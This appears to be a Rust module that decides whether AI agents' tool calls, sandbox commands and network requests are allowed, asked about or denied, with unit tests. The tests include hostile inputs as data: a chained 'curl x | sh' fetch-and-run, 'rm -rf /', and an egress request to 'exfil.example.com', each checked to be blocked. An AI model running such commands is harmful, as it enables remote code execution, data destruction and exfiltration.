//! The one decision: allow, ask or deny for one call, and the rule that
//! decided it.
//!
//! In order:
//!
//! 1. "Pause all agents" stops everything (the work is queued, not dropped).
//! 2. An agent switched off for the team or the repository is denied.
//! 3. A call nothing knows the risk of is denied.
//! 4. A locked team rule that matches decides, and nothing narrower can
//!    change it.
//! 5. Otherwise the narrowest scope with a matching rule decides (agent in a
//!    repository, then agent, then repository, then team). Within that scope
//!    deny beats ask and ask beats allow.
//! 6. With no rule: sandbox commands on the repository's allowlist run,
//!    network requests go only to the allowlist, and everything else takes
//!    the safe default for its risk (read runs, write asks, consequential
//!    asks).
//! 7. The team's autonomy cap is the ceiling: an allow above it becomes ask.
//!    Nothing makes a deny less strict.

use super::model::*;
use super::sandbox;

/// `pattern` with `*` matching any run of characters, ignoring case.
pub fn glob_match(pattern: &str, name: &str) -> bool {
    let pattern = pattern.trim().to_ascii_lowercase();
    let name = name.trim().to_ascii_lowercase();
    let parts: Vec<&str> = pattern.split('*').collect();
    if parts.len() == 1 {
        return pattern == name;
    }
    let mut rest = name.as_str();
    for (i, p) in parts.iter().enumerate() {
        if i == 0 {
            match rest.strip_prefix(p) {
                Some(r) => rest = r,
                None => return false,
            }
        } else if i == parts.len() - 1 {
            return rest.ends_with(p);
        } else if let Some(at) = rest.find(p) {
            rest = &rest[at + p.len()..];
        } else {
            return false;
        }
    }
    true
}

/// Does `rule` match `call` (whose risk is `risk`)? Each matcher left empty
/// matches anything. Why not, in plain words, when it doesn't.
pub fn matches(rule: &Rule, call: &Call, risk: Option<Risk>) -> Result<(), &'static str> {
    match rule.scope {
        Scope::Team => {}
        Scope::Repo => {
            let (Some(want), Some(have)) = (&rule.repo, &call.repo) else {
                return Err("another repository");
            };
            if !want.eq_ignore_ascii_case(have) {
                return Err("another repository");
            }
        }
        Scope::Agent => {
            if rule.agent != Some(call.agent) {
                return Err("another agent");
            }
            if let Some(want) = &rule.repo {
                if !call
                    .repo
                    .as_deref()
                    .is_some_and(|h| h.eq_ignore_ascii_case(want))
                {
                    return Err("another repository");
                }
            }
        }
    }
    if rule.scope != Scope::Agent {
        if let Some(a) = rule.agent {
            if a != call.agent {
                return Err("another agent");
            }
        }
    }
    if let Some(k) = rule.kind {
        if k != call.kind {
            return Err("another kind of call");
        }
    }
    // Sandbox commands and network requests are decided by rules written
    // for them (and by their allowlists), never by a broad rule about risk.
    if matches!(call.kind, CallKind::Command | CallKind::Egress)
        && rule.kind != Some(call.kind)
        && rule.command.is_none()
    {
        return Err("not a rule for sandbox commands or network requests");
    }
    if let Some(s) = &rule.server {
        match &call.server {
            Some(have) if glob_match(s, have) => {}
            _ => return Err("another server"),
        }
    }
    if let Some(t) = &rule.tool {
        if !(glob_match(t, &call.tool) || glob_match(t, call.bare_tool())) {
            return Err("another tool");
        }
    }
    if let Some(r) = rule.risk {
        if Some(r) != risk {
            return Err("another risk");
        }
    }
    if let Some(c) = &rule.command {
        let Some(have) = &call.command else {
            return Err("not a command or network request");
        };
        let ok = match call.kind {
            CallKind::Egress => sandbox::domain_matches(c, have),
            _ => sandbox::command_matches(c, have),
        };
        if !ok {
            return Err("another command");
        }
    }
    Ok(())
}

/// One rule's part in a decision, for the "test a call" box.
#[derive(Debug, Clone, PartialEq, Eq, serde::Serialize)]
pub struct Considered {
    pub id: String,
    pub label: String,
    pub matched: bool,
    /// Why it didn't match, or what it would decide.
    pub note: String,
}

/// The decision and every rule looked at on the way.
#[derive(Debug, Clone, PartialEq, Eq, serde::Serialize)]
pub struct Explanation {
    pub verdict: Verdict,
    pub considered: Vec<Considered>,
}

fn default_for(risk: Risk) -> Decision {
    match risk {
        Risk::Read => Decision::Allow,
        Risk::Write | Risk::Consequential => Decision::Ask,
    }
}

fn rule_verdict(r: &Rule, risk: Option<Risk>) -> Verdict {
    Verdict {
        decision: r.decision,
        risk,
        decided_by: DecidedBy::Rule {
            id: r.id.clone(),
            scope: r.scope,
            label: r.label(),
        },
        reason: if r.note.is_empty() {
            r.label()
        } else {
            format!("{} ({})", r.label(), r.note)
        },
        capped: false,
    }
}

/// The cap: an allow above the team's autonomy becomes ask.
fn cap(mut v: Verdict, autonomy: Autonomy) -> Verdict {
    if v.decision != Decision::Allow {
        return v;
    }
    let Some(risk) = v.risk else { return v };
    if risk > autonomy.max_allowed() {
        v.decision = Decision::Ask;
        v.capped = true;
        v.reason = format!(
            "{} The team's autonomy limit holds {} actions to ask.",
            v.reason,
            risk.as_str()
        );
    }
    v
}

/// Decides one call. `risk` is the call's risk from the tool registry, or
/// `None` when nothing knows the tool. `now` is RFC 3339.
pub fn decide(policy: &TeamPolicy, call: &Call, risk: Option<Risk>, now: &str) -> Verdict {
    explain(policy, call, risk, now).verdict
}

/// [`decide`], with every rule it looked at.
pub fn explain(policy: &TeamPolicy, call: &Call, risk: Option<Risk>, now: &str) -> Explanation {
    // Commands and network requests are changes by definition.
    let risk = match call.kind {
        CallKind::Command | CallKind::Egress => Some(risk.unwrap_or(Risk::Write)),
        _ => risk,
    };
    let mut considered = Vec::new();
    let done = |verdict: Verdict, considered: Vec<Considered>| Explanation {
        verdict,
        considered,
    };

    if let Some(p) = policy.paused(now) {
        return done(
            Verdict {
                decision: Decision::Deny,
                risk,
                decided_by: DecidedBy::Paused {
                    reason: p.reason.clone(),
                },
                reason: format!(
                    "All agents are paused{}. The work waits and resumes when the pause ends.",
                    if p.reason.is_empty() {
                        String::new()
                    } else {
                        format!(": {}", p.reason)
                    }
                ),
                capped: false,
            },
            considered,
        );
    }
    if let Some(scope) = policy.switches.off(call.agent, call.repo.as_deref()) {
        return done(
            Verdict {
                decision: Decision::Deny,
                risk,
                decided_by: DecidedBy::AgentOff { scope },
                reason: match scope {
                    Scope::Repo => format!(
                        "The {} is switched off for this repository.",
                        call.agent.label().to_lowercase()
                    ),
                    _ => format!(
                        "The {} is switched off for the team.",
                        call.agent.label().to_lowercase()
                    ),
                },
                capped: false,
            },
            considered,
        );
    }
    let Some(known) = risk else {
        return done(
            Verdict {
                decision: Decision::Deny,
                risk: None,
                decided_by: DecidedBy::Unknown,
                reason: format!(
                    "Nothing says what {} does, so it doesn't run. Unknown tools are always denied.",
                    call.tool
                ),
                capped: false,
            },
            considered,
        );
    };

    let mut matched: Vec<&Rule> = Vec::new();
    for r in &policy.rules {
        let m = matches(r, call, risk);
        considered.push(Considered {
            id: r.id.clone(),
            label: r.label(),
            matched: m.is_ok(),
            note: match m {
                Ok(()) => format!("matches: {}", r.decision.as_str()),
                Err(why) => format!("no match: {why}"),
            },
        });
        if m.is_ok() {
            matched.push(r);
        }
    }

    // A locked team rule is final.
    let locked = matched
        .iter()
        .filter(|r| r.locked && r.scope == Scope::Team)
        .max_by_key(|r| r.decision);
    if let Some(r) = locked {
        return done(cap(rule_verdict(r, risk), policy.autonomy), considered);
    }

    // The narrowest scope with a match; the strictest rule in it. A network
    // request can be denied by a rule but only allowed by the allowlist.
    let narrowest = matched.iter().map(|r| r.specificity()).max();
    if let Some(level) = narrowest {
        let r = matched
            .iter()
            .filter(|r| r.specificity() == level)
            .max_by_key(|r| r.decision)
            .expect("a rule at the narrowest level");
        let egress_allow = call.kind == CallKind::Egress && r.decision == Decision::Allow;
        if !egress_allow {
            return done(cap(rule_verdict(r, risk), policy.autonomy), considered);
        }
    }

    let verdict = match call.kind {
        CallKind::Command => {
            let cmd = call.command.as_deref().unwrap_or("");
            match call
                .repo
                .as_deref()
                .and_then(|r| sandbox::allowed_entry(&policy.sandbox, r, cmd))
            {
                Some(entry) => Verdict {
                    decision: Decision::Allow,
                    risk,
                    decided_by: DecidedBy::CommandAllowlist {
                        command: entry.to_string(),
                    },
                    reason: format!("\"{entry}\" is on this repository's command allowlist."),
                    capped: false,
                },
                None => Verdict {
                    decision: Decision::Ask,
                    risk,
                    decided_by: DecidedBy::Default { risk: known },
                    reason:
                        "This command isn't on the repository's allowlist, so a person decides."
                            .into(),
                    capped: false,
                },
            }
        }
        CallKind::Egress => {
            let host = call.command.as_deref().unwrap_or("");
            if !policy.sandbox.limit_egress || sandbox::domain_allowed(&policy.sandbox.egress, host)
            {
                Verdict {
                    decision: Decision::Allow,
                    risk,
                    decided_by: DecidedBy::EgressAllowlist,
                    reason: if policy.sandbox.limit_egress {
                        format!("{host} is on the sandbox's network allowlist.")
                    } else {
                        "The sandbox network isn't limited for this team.".into()
                    },
                    capped: false,
                }
            } else {
                Verdict {
                    decision: Decision::Deny,
                    risk,
                    decided_by: DecidedBy::EgressAllowlist,
                    reason: format!("{host} isn't on the sandbox's network allowlist."),
                    capped: false,
                }
            }
        }
        _ => Verdict {
            decision: default_for(known),
            risk,
            decided_by: DecidedBy::Default { risk: known },
            reason: match known {
                Risk::Read => "Reads run by default.".into(),
                Risk::Write => "Changes ask by default.".into(),
                Risk::Consequential => {
                    "Actions that reach people or can't be undone ask by default.".into()
                }
            },
            capped: false,
        },
    };
    // The network allowlist is its own ceiling; the cap applies to the rest.
    let verdict = if call.kind == CallKind::Egress {
        verdict
    } else {
        cap(verdict, policy.autonomy)
    };
    done(verdict, considered)
}

/// Why a rule can't be saved, in plain words.
pub fn validate_rule(rule: &Rule, autonomy: Autonomy) -> Result<(), String> {
    match rule.scope {
        Scope::Repo if rule.repo.as_deref().is_none_or(|r| !r.contains('/')) => {
            return Err("A repository rule needs a repository (owner/name).".into());
        }
        Scope::Agent if rule.agent.is_none() => {
            return Err("An agent rule needs an agent.".into());
        }
        Scope::Team if rule.repo.is_some() => {
            return Err("A team rule can't name a repository; make it a repository rule.".into());
        }
        _ => {}
    }
    if rule.locked && rule.scope != Scope::Team {
        return Err("Only a team rule can be locked.".into());
    }
    for (what, v) in [
        ("tool", &rule.tool),
        ("server", &rule.server),
        ("command", &rule.command),
    ] {
        if let Some(v) = v {
            if v.trim().is_empty() || v.len() > 200 {
                return Err(format!("The {what} pattern must be 1 to 200 characters."));
            }
        }
    }
    if rule.note.len() > 300 {
        return Err("Keep the note under 300 characters.".into());
    }
    // An allow that can only ever reach consequential tools is above a
    // cap that forbids them: refuse it rather than save a rule that never
    // does what it says.
    if rule.decision == Decision::Allow {
        if let Some(r) = rule.risk {
            if r > autonomy.max_allowed() {
                return Err(format!(
                    "The team's autonomy limit doesn't let {} actions run without asking. \
                     Raise the limit first, or make this rule ask.",
                    r.as_str()
                ));
            }
        }
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    const NOW: &str = "2026-10-24T12:00:00Z";

    fn rule(id: &str, scope: Scope, decision: Decision) -> Rule {
        Rule {
            id: id.into(),
            scope,
            repo: None,
            agent: None,
            kind: None,
            server: None,
            tool: None,
            risk: None,
            command: None,
            decision,
            locked: false,
            note: String::new(),
            source: RuleSource::Manual,
            created_by: String::new(),
            created_at: String::new(),
        }
    }

    fn with_rules(rules: Vec<Rule>) -> TeamPolicy {
        TeamPolicy {
            rules,
            ..Default::default()
        }
    }

    fn write_call() -> Call {
        Call::tool(Agent::Coder, "write_file").in_repo(Some("acme/web"))
    }

    #[test]
    fn safe_defaults_by_risk() {
        let p = TeamPolicy::default();
        let read = decide(
            &p,
            &Call::tool(Agent::Coder, "read_file"),
            Some(Risk::Read),
            NOW,
        );
        assert_eq!(read.decision, Decision::Allow);
        assert_eq!(read.decided_by, DecidedBy::Default { risk: Risk::Read });
        let write = decide(&p, &write_call(), Some(Risk::Write), NOW);
        assert_eq!(write.decision, Decision::Ask);
        let send = decide(
            &p,
            &Call::tool(Agent::Coder, "slack__send_message").on_server(CallKind::Mcp, "slack"),
            Some(Risk::Consequential),
            NOW,
        );
        assert_eq!(send.decision, Decision::Ask);
    }

    #[test]
    fn unknown_tools_are_denied_whatever_the_rules_say() {
        let mut allow_all = rule("a", Scope::Team, Decision::Allow);
        allow_all.tool = Some("*".into());
        let p = TeamPolicy {
            autonomy: Autonomy::Full,
            ..with_rules(vec![allow_all])
        };
        let v = decide(&p, &Call::tool(Agent::Coder, "mystery"), None, NOW);
        assert_eq!(v.decision, Decision::Deny);
        assert_eq!(v.decided_by, DecidedBy::Unknown);
    }

    #[test]
    fn deny_beats_ask_beats_allow_at_the_same_scope() {
        let mut allow = rule("allow", Scope::Team, Decision::Allow);
        allow.tool = Some("write_*".into());
        let mut ask = rule("ask", Scope::Team, Decision::Ask);
        ask.tool = Some("write_file".into());
        let mut deny = rule("deny", Scope::Team, Decision::Deny);
        deny.risk = Some(Risk::Write);

        let v = decide(
            &with_rules(vec![allow.clone(), ask.clone()]),
            &write_call(),
            Some(Risk::Write),
            NOW,
        );
        assert_eq!(v.decision, Decision::Ask);
        assert_eq!(v.decided_by.rule_id(), Some("ask"));

        let v = decide(
            &with_rules(vec![allow, ask, deny]),
            &write_call(),
            Some(Risk::Write),
            NOW,
        );
        assert_eq!(v.decision, Decision::Deny);
        assert_eq!(v.decided_by.rule_id(), Some("deny"));
    }

    #[test]
    fn the_narrowest_scope_wins() {
        let mut team = rule("team", Scope::Team, Decision::Deny);
        team.tool = Some("write_file".into());
        let mut repo = rule("repo", Scope::Repo, Decision::Ask);
        repo.repo = Some("acme/web".into());
        repo.tool = Some("write_file".into());
        let mut agent = rule("agent", Scope::Agent, Decision::Allow);
        agent.agent = Some(Agent::Coder);
        agent.tool = Some("write_file".into());
        let mut agent_repo = rule("agent_repo", Scope::Agent, Decision::Ask);
        agent_repo.agent = Some(Agent::Coder);
        agent_repo.repo = Some("acme/web".into());
        agent_repo.tool = Some("write_file".into());

        let p = with_rules(vec![team.clone()]);
        assert_eq!(
            decide(&p, &write_call(), Some(Risk::Write), NOW).decision,
            Decision::Deny
        );
        let p = with_rules(vec![team.clone(), repo.clone()]);
        let v = decide(&p, &write_call(), Some(Risk::Write), NOW);
        assert_eq!(v.decided_by.rule_id(), Some("repo"));
        let p = with_rules(vec![team.clone(), repo.clone(), agent.clone()]);
        let v = decide(&p, &write_call(), Some(Risk::Write), NOW);
        assert_eq!(v.decided_by.rule_id(), Some("agent"));
        assert_eq!(v.decision, Decision::Allow);
        let p = with_rules(vec![team, repo, agent, agent_repo]);
        let v = decide(&p, &write_call(), Some(Risk::Write), NOW);
        assert_eq!(v.decided_by.rule_id(), Some("agent_repo"));

        // A repository rule doesn't reach another repository.
        let mut other = rule("other", Scope::Repo, Decision::Allow);
        other.repo = Some("acme/api".into());
        let v = decide(
            &with_rules(vec![other]),
            &write_call(),
            Some(Risk::Write),
            NOW,
        );
        assert_eq!(v.decided_by, DecidedBy::Default { risk: Risk::Write });
    }

    #[test]
    fn a_locked_team_rule_cannot_be_overridden() {
        let mut team = rule("team", Scope::Team, Decision::Deny);
        team.tool = Some("write_file".into());
        team.locked = true;
        let mut agent = rule("agent", Scope::Agent, Decision::Allow);
        agent.agent = Some(Agent::Coder);
        let v = decide(
            &with_rules(vec![team, agent]),
            &write_call(),
            Some(Risk::Write),
            NOW,
        );
        assert_eq!(v.decision, Decision::Deny);
        assert_eq!(v.decided_by.rule_id(), Some("team"));
    }

    #[test]
    fn the_autonomy_cap_is_a_ceiling() {
        let mut allow = rule("allow", Scope::Agent, Decision::Allow);
        allow.agent = Some(Agent::Coder);
        let send =
            Call::tool(Agent::Coder, "slack__send_message").on_server(CallKind::Mcp, "slack");
        // Standard: writes may run, consequential is held to ask.
        let p = with_rules(vec![allow.clone()]);
        let v = decide(&p, &write_call(), Some(Risk::Write), NOW);
        assert_eq!(v.decision, Decision::Allow);
        let v = decide(&p, &send, Some(Risk::Consequential), NOW);
        assert_eq!(v.decision, Decision::Ask);
        assert!(v.capped);
        assert_eq!(v.decided_by.rule_id(), Some("allow"));
        // Read only: even writes ask.
        let p = TeamPolicy {
            autonomy: Autonomy::ReadOnly,
            ..with_rules(vec![allow.clone()])
        };
        assert_eq!(
            decide(&p, &write_call(), Some(Risk::Write), NOW).decision,
            Decision::Ask
        );
        // Full: the rule decides.
        let p = TeamPolicy {
            autonomy: Autonomy::Full,
            ..with_rules(vec![allow])
        };
        let v = decide(&p, &send, Some(Risk::Consequential), NOW);
        assert_eq!(v.decision, Decision::Allow);
        assert!(!v.capped);
        // The cap never relaxes a deny.
        let mut deny = rule("deny", Scope::Team, Decision::Deny);
        deny.tool = Some("read_file".into());
        let p = TeamPolicy {
            autonomy: Autonomy::Full,
            ..with_rules(vec![deny])
        };
        assert_eq!(
            decide(
                &p,
                &Call::tool(Agent::Coder, "read_file"),
                Some(Risk::Read),
                NOW
            )
            .decision,
            Decision::Deny
        );
    }

    #[test]
    fn a_rule_allowing_consequential_above_the_cap_is_refused() {
        let mut r = rule("r", Scope::Team, Decision::Allow);
        r.risk = Some(Risk::Consequential);
        assert!(validate_rule(&r, Autonomy::Standard).is_err());
        assert!(validate_rule(&r, Autonomy::Full).is_ok());
        r.risk = Some(Risk::Write);
        assert!(validate_rule(&r, Autonomy::ReadOnly).is_err());
        let mut repo = rule("x", Scope::Repo, Decision::Ask);
        assert!(validate_rule(&repo, Autonomy::Standard).is_err());
        repo.repo = Some("acme/web".into());
        assert!(validate_rule(&repo, Autonomy::Standard).is_ok());
        repo.locked = true;
        assert!(validate_rule(&repo, Autonomy::Standard).is_err());
    }

    #[test]
    fn switched_off_agents_and_pause() {
        let mut p = TeamPolicy::default();
        p.switches
            .repo_off
            .entry("acme/web".into())
            .or_default()
            .insert(Agent::Coder);
        let v = decide(&p, &write_call(), Some(Risk::Write), NOW);
        assert_eq!(v.decided_by, DecidedBy::AgentOff { scope: Scope::Repo });
        let other = Call::tool(Agent::Coder, "write_file").in_repo(Some("acme/api"));
        assert_eq!(
            decide(&p, &other, Some(Risk::Write), NOW).decision,
            Decision::Ask
        );
        p.switches.team_off.insert(Agent::Reviewer);
        let v = decide(
            &p,
            &Call::tool(Agent::Reviewer, "read_file"),
            Some(Risk::Read),
            NOW,
        );
        assert_eq!(v.decided_by, DecidedBy::AgentOff { scope: Scope::Team });

        p.pause = Some(Pause {
            reason: "Release freeze".into(),
            by: "a@x.dev".into(),
            at: NOW.into(),
            until: Some("2026-10-24T13:00:00Z".into()),
        });
        let v = decide(
            &p,
            &Call::tool(Agent::Planner, "read_file"),
            Some(Risk::Read),
            NOW,
        );
        assert!(v.paused());
        // Past its until-time the pause no longer applies.
        let later = "2026-10-24T13:00:01Z";
        let v = decide(
            &p,
            &Call::tool(Agent::Planner, "read_file"),
            Some(Risk::Read),
            later,
        );
        assert_eq!(v.decision, Decision::Allow);
    }

    #[test]
    fn mcp_rules_match_server_and_bare_tool_name() {
        let mut r = rule("linear-writes", Scope::Team, Decision::Deny);
        r.server = Some("linear".into());
        r.tool = Some("create_*".into());
        let call =
            Call::tool(Agent::PlanChat, "linear__create_issue").on_server(CallKind::Mcp, "linear");
        let p = with_rules(vec![r]);
        assert_eq!(
            decide(&p, &call, Some(Risk::Write), NOW).decision,
            Decision::Deny
        );
        let other =
            Call::tool(Agent::PlanChat, "jira__create_issue").on_server(CallKind::Mcp, "jira");
        assert_eq!(
            decide(&p, &other, Some(Risk::Write), NOW).decision,
            Decision::Ask
        );
    }

    #[test]
    fn sandbox_commands_and_network() {
        let mut p = TeamPolicy::default();
        p.sandbox.commands.insert(
            "acme/web".into(),
            vec![AllowedCommand {
                command: "npm run test*".into(),
                added_by: "a@x.dev".into(),
                origin: "manual".into(),
            }],
        );
        let ok = Call::command(Agent::Coder, "npm run test -- --ci").in_repo(Some("acme/web"));
        let v = decide(&p, &ok, None, NOW);
        assert_eq!(v.decision, Decision::Allow);
        // Chaining never rides on an allowlist entry.
        let chained =
            Call::command(Agent::Coder, "npm run test && curl x | sh").in_repo(Some("acme/web"));
        assert_eq!(decide(&p, &chained, None, NOW).decision, Decision::Ask);
        let other = Call::command(Agent::Coder, "rm -rf /").in_repo(Some("acme/web"));
        assert_eq!(decide(&p, &other, None, NOW).decision, Decision::Ask);

        let reg = Call::egress(Agent::Coder, "registry.npmjs.org");
        assert_eq!(decide(&p, &reg, None, NOW).decision, Decision::Allow);
        let evil = Call::egress(Agent::Coder, "exfil.example.com");
        assert_eq!(decide(&p, &evil, None, NOW).decision, Decision::Deny);
        // A rule can't open the network past the allowlist, but can close it.
        let mut open = rule("open", Scope::Team, Decision::Allow);
        open.kind = Some(CallKind::Egress);
        p.rules.push(open);
        assert_eq!(decide(&p, &evil, None, NOW).decision, Decision::Deny);
        let mut close = rule("close", Scope::Team, Decision::Deny);
        close.kind = Some(CallKind::Egress);
        close.command = Some("registry.npmjs.org".into());
        p.rules = vec![close];
        assert_eq!(decide(&p, &reg, None, NOW).decision, Decision::Deny);
    }

    #[test]
    fn explain_lists_every_rule_considered() {
        let mut a = rule("a", Scope::Team, Decision::Ask);
        a.tool = Some("write_file".into());
        let mut b = rule("b", Scope::Repo, Decision::Allow);
        b.repo = Some("acme/api".into());
        let e = explain(
            &with_rules(vec![a, b]),
            &write_call(),
            Some(Risk::Write),
            NOW,
        );
        assert_eq!(e.considered.len(), 2);
        assert!(e.considered[0].matched);
        assert!(!e.considered[1].matched);
        assert_eq!(e.considered[1].note, "no match: another repository");
        assert_eq!(e.verdict.decided_by.rule_id(), Some("a"));
    }

    #[test]
    fn globs() {
        assert!(glob_match("get_*", "GET_issue"));
        assert!(glob_match("*_draft", "create_draft"));
        assert!(glob_match("a*b*c", "aXbYc"));
        assert!(!glob_match("a*b*c", "aXbY"));
        assert!(glob_match("*", "anything"));
        assert!(!glob_match("exact", "exactly"));
    }
}
